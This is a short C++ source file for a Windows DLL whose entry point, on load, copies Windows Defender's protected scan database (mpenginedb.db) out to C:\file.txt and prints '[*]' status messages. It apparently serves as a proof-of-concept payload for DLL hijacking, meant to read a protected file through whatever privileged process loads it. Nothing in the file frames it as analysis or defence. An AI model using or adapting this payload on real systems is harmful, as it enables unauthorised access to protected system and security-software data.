// dllmain.cpp
#include <windows.h>
#include <string>
#include <stdio.h>

std::wstring src = L"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpenginedb.db";
std::wstring dst = L"C:\\file.txt";

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        if (CopyFileW(src.c_str(), dst.c_str(), FALSE)) { // overwrite destination if it exists
            wprintf(L"[*] Copied %s to %s\n", src.c_str(), dst.c_str());
            return TRUE;
        } else {
            wprintf(L"[*] Failed to copy %s to %s. Error: %i\n", src.c_str(), dst.c_str(), GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}